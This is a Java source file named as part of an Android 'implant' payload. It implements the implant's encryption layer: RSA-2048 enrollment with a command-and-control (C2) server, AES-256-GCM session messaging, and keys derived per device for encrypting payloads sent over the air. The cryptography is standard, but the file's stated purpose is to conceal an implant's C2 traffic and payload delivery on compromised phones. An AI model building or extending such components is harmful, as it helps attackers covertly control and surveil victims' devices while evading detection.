// ============================================================
// FILE: payload/module/src/main/java/io/hackerai/implant/crypto/CryptoEngine.java
// ============================================================
package io.hackerai.implant.crypto;

import android.util.Base64;
import android.util.Log;

import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * CryptoEngine — layered encryption for implant communications.
 *
 * Architecture:
 *   - Device generates RSA-2048 keypair on first launch
 *   - Public key sent to C2 during enrollment (device identity)
 *   - C2 encrypts a session AES-256-GCM key with the device's RSA public key
 *   - All subsequent messages use AES-256-GCM with session key
 *   - Payload files encrypted with per-device AES key derived from device ID + C2 secret
 *
 * C2 → Device:
 *   RSA-OAEP(AES-256 session key) || AES-GCM(ciphertext, nonce)
 *
 * Device → C2:
 *   RSA-OAEP(ephemeral AES key) || AES-GCM(ciphertext, nonce)
 */
public class CryptoEngine {
    private static final String TAG = "CryptoEngine";

    private static final String RSA_ALGO = "RSA/ECB/OAEPWithSHA-256AndMGF1Padding";
    private static final String AES_ALGO = "AES/GCM/NoPadding";
    private static final int AES_KEY_SIZE = 256;
    private static final int GCM_TAG_LENGTH = 128; // bits
    private static final int GCM_NONCE_LENGTH = 12; // bytes

    private PrivateKey rsaPrivateKey;
    private PublicKey rsaPublicKey;
    private SecretKey sessionKey;

    private final SecureRandom secureRandom = new SecureRandom();

    /** Generate a new RSA-2048 keypair. */
    public KeyPair generateRsaKeypair() {
        try {
            KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
            gen.initialize(2048, secureRandom);
            KeyPair pair = gen.generateKeyPair();
            this.rsaPrivateKey = pair.getPrivate();
            this.rsaPublicKey = pair.getPublic();
            Log.i(TAG, "RSA-2048 keypair generated.");
            return pair;
        } catch (Exception e) {
            Log.e(TAG, "RSA keypair generation failed", e);
            return null;
        }
    }

    /** Load an existing RSA private key (from persistent storage). */
    public void loadPrivateKey(byte[] encoded) {
        try {
            PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(encoded);
            KeyFactory kf = KeyFactory.getInstance("RSA");
            this.rsaPrivateKey = kf.generatePrivate(spec);
            this.rsaPublicKey = null; // derived on demand
            Log.i(TAG, "RSA private key loaded.");
        } catch (Exception e) {
            Log.e(TAG, "Failed to load RSA private key", e);
        }
    }

    /** Load an existing RSA public key (from C2). */
    public void loadPublicKey(byte[] encoded) {
        try {
            X509EncodedKeySpec spec = new X509EncodedKeySpec(encoded);
            KeyFactory kf = KeyFactory.getInstance("RSA");
            this.rsaPublicKey = kf.generatePublic(spec);
            Log.i(TAG, "RSA public key loaded.");
        } catch (Exception e) {
            Log.e(TAG, "Failed to load RSA public key", e);
        }
    }

    /** Get Base64-encoded public key for enrollment. */
    public String getPublicKeyBase64() {
        if (rsaPublicKey == null) return null;
        return Base64.encodeToString(rsaPublicKey.getEncoded(), Base64.NO_WRAP);
    }

    /** Get encoded private key for persistent storage. */
    public byte[] getPrivateKeyEncoded() {
        if (rsaPrivateKey == null) return null;
        return rsaPrivateKey.getEncoded();
    }

    /**
     * Decrypt a session key sent by the C2 (RSA OAEP).
     * @param encryptedKey Base64-encoded RSA-encrypted AES key.
     * @return true if session key was set successfully.
     */
    public boolean decryptSessionKey(String encryptedKey) {
        try {
            byte[] encrypted = Base64.decode(encryptedKey, Base64.NO_WRAP);
            Cipher cipher = Cipher.getInstance(RSA_ALGO);
            cipher.init(Cipher.DECRYPT_MODE, rsaPrivateKey);
            byte[] aesKeyBytes = cipher.doFinal(encrypted);
            this.sessionKey = new SecretKeySpec(aesKeyBytes, "AES");
            Log.i(TAG, "Session key decrypted successfully.");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Session key decryption failed", e);
            return false;
        }
    }

    /** Generate a fresh AES-256 session key. */
    public SecretKey generateSessionKey() {
        try {
            KeyGenerator gen = KeyGenerator.getInstance("AES");
            gen.init(AES_KEY_SIZE, secureRandom);
            this.sessionKey = gen.generateKey();
            return sessionKey;
        } catch (Exception e) {
            Log.e(TAG, "Session key generation failed", e);
            return null;
        }
    }

    /**
     * Encrypt a session key with the C2's public key.
     * @return Base64-encoded RSA-OAEP ciphertext.
     */
    public String encryptSessionKey(PublicKey c2PublicKey) {
        if (sessionKey == null) generateSessionKey();
        try {
            Cipher cipher = Cipher.getInstance(RSA_ALGO);
            cipher.init(Cipher.ENCRYPT_MODE, c2PublicKey != null ? c2PublicKey : rsaPublicKey);
            byte[] encrypted = cipher.doFinal(sessionKey.getEncoded());
            return Base64.encodeToString(encrypted, Base64.NO_WRAP);
        } catch (Exception e) {
            Log.e(TAG, "Session key encryption failed", e);
            return null;
        }
    }

    public void setSessionKey(byte[] keyBytes) {
        this.sessionKey = new SecretKeySpec(keyBytes, "AES");
    }

    public boolean hasSessionKey() { return sessionKey != null; }

    // ==============================================================
    // AES-GCM message encryption / decryption
    // ==============================================================

    /**
     * Encrypt a plaintext message with the session key.
     * @return Base64-encoded "nonce:ciphertext"
     */
    public String encrypt(String plaintext) {
        if (sessionKey == null) {
            Log.e(TAG, "No session key — cannot encrypt");
            return null;
        }
        try {
            byte[] nonce = new byte[GCM_NONCE_LENGTH];
            secureRandom.nextBytes(nonce);

            Cipher cipher = Cipher.getInstance(AES_ALGO);
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
            cipher.init(Cipher.ENCRYPT_MODE, sessionKey, spec);

            byte[] ciphertext = cipher.doFinal(
                    plaintext.getBytes(StandardCharsets.UTF_8));

            // Combine nonce + ciphertext
            byte[] combined = new byte[nonce.length + ciphertext.length];
            System.arraycopy(nonce, 0, combined, 0, nonce.length);
            System.arraycopy(ciphertext, 0, combined, nonce.length, ciphertext.length);

            return Base64.encodeToString(combined, Base64.NO_WRAP);
        } catch (Exception e) {
            Log.e(TAG, "Encryption failed", e);
            return null;
        }
    }

    /**
     * Decrypt a Base64-encoded "nonce:ciphertext" message.
     */
    public String decrypt(String encryptedBase64) {
        if (sessionKey == null) {
            Log.e(TAG, "No session key — cannot decrypt");
            return null;
        }
        try {
            byte[] combined = Base64.decode(encryptedBase64, Base64.NO_WRAP);
            if (combined.length < GCM_NONCE_LENGTH + 1) {
                Log.e(TAG, "Ciphertext too short");
                return null;
            }

            byte[] nonce = new byte[GCM_NONCE_LENGTH];
            System.arraycopy(combined, 0, nonce, 0, GCM_NONCE_LENGTH);

            byte[] ciphertext = new byte[combined.length - GCM_NONCE_LENGTH];
            System.arraycopy(combined, GCM_NONCE_LENGTH, ciphertext, 0, ciphertext.length);

            Cipher cipher = Cipher.getInstance(AES_ALGO);
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
            cipher.init(Cipher.DECRYPT_MODE, sessionKey, spec);

            byte[] plaintext = cipher.doFinal(ciphertext);
            return new String(plaintext, StandardCharsets.UTF_8);
        } catch (Exception e) {
            Log.e(TAG, "Decryption failed", e);
            return null;
        }
    }

    // ==============================================================
    // Payload encryption (device-specific, pre-shared key)
    // ==============================================================

    /**
     * Derive a device-specific AES key from device ID + C2 secret.
     * Used for over-the-air payload encryption.
     */
    public static byte[] deriveDeviceKey(String deviceId, String c2Secret) {
        try {
            MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
            sha256.update(deviceId.getBytes(StandardCharsets.UTF_8));
            sha256.update(c2Secret.getBytes(StandardCharsets.UTF_8));
            return sha256.digest();
        } catch (Exception e) {
            Log.e(TAG, "Key derivation failed", e);
            return null;
        }
    }

    /**
     * Encrypt payload bytes with a derived device key.
     */
    public static byte[] encryptPayload(byte[] plaintext, byte[] aesKey) {
        try {
            SecureRandom sr = new SecureRandom();
            byte[] nonce = new byte[GCM_NONCE_LENGTH];
            sr.nextBytes(nonce);

            SecretKeySpec keySpec = new SecretKeySpec(aesKey, "AES");
            Cipher cipher = Cipher.getInstance(AES_ALGO);
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, spec);

            byte[] ciphertext = cipher.doFinal(plaintext);
            byte[] combined = new byte[nonce.length + ciphertext.length];
            System.arraycopy(nonce, 0, combined, 0, nonce.length);
            System.arraycopy(ciphertext, 0, combined, nonce.length, ciphertext.length);
            return combined;
        } catch (Exception e) {
            Log.e(TAG, "Payload encryption failed", e);
            return null;
        }
    }

    /**
     * Decrypt payload bytes with a derived device key.
     */
    public static byte[] decryptPayload(byte[] encrypted, byte[] aesKey) {
        try {
            if (encrypted.length < GCM_NONCE_LENGTH + 1) return null;

            byte[] nonce = new byte[GCM_NONCE_LENGTH];
            System.arraycopy(encrypted, 0, nonce, 0, GCM_NONCE_LENGTH);

            byte[] ciphertext = new byte[encrypted.length - GCM_NONCE_LENGTH];
            System.arraycopy(encrypted, GCM_NONCE_LENGTH, ciphertext, 0, ciphertext.length);

            SecretKeySpec keySpec = new SecretKeySpec(aesKey, "AES");
            Cipher cipher = Cipher.getInstance(AES_ALGO);
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, spec);

            return cipher.doFinal(ciphertext);
        } catch (Exception e) {
            Log.e(TAG, "Payload decryption failed", e);
            return null;
        }
    }

    /** SHA-256 hash utility. */
    public static String sha256(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(input.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }

    /** Generate a random hex string (for device IDs, nonces). */
    public static String randomHex(int bytes) {
        SecureRandom sr = new SecureRandom();
        byte[] buf = new byte[bytes];
        sr.nextBytes(buf);
        StringBuilder sb = new StringBuilder();
        for (byte b : buf) sb.append(String.format("%02x", b));
        return sb.toString();
    }
        }
